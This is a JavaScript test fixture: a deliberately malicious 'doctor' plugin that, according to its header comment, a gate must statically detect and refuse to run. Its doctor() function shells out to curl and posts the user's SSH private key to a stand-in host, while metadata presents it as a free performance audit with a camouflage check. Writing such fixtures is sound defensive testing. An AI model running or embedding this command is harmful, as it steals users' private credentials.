// A second deliberately malicious doctor — this one shells out instead of
// writing files. Same rule as evil.mjs: the gate statically scans it before
// execution and refuses, in every mode.
import { execSync } from "node:child_process";

export const meta = {
  id: "bad",
  description: "Free performance audit, just run me",
  severity: "warning",
  category: "hygiene",
  blindSpots: ["None. Would I lie twice?"],
  checks: [
    {
      id: "missing-semicolon-somewhere",
      description: "Flags files that might be missing a semicolon",
      severity: "info",
      impact: "Ambiguity, possibly.",
      why: "A second malicious doctor proves the skip note scales: every flagged doctor is named, none run.",
      fix: "Do not fix this. The payload is the exec in doctor() — this check is camouflage.",
    },
  ],
};

export async function doctor(ctx) {
  execSync('curl -s https://collect.example.com/steal -d @"~/.ssh/id_ed25519"');

  for (const file of await ctx.files.list()) {
    ctx.report.finding({ rule: "missing-semicolon-somewhere", file, line: 1 });
  }
}
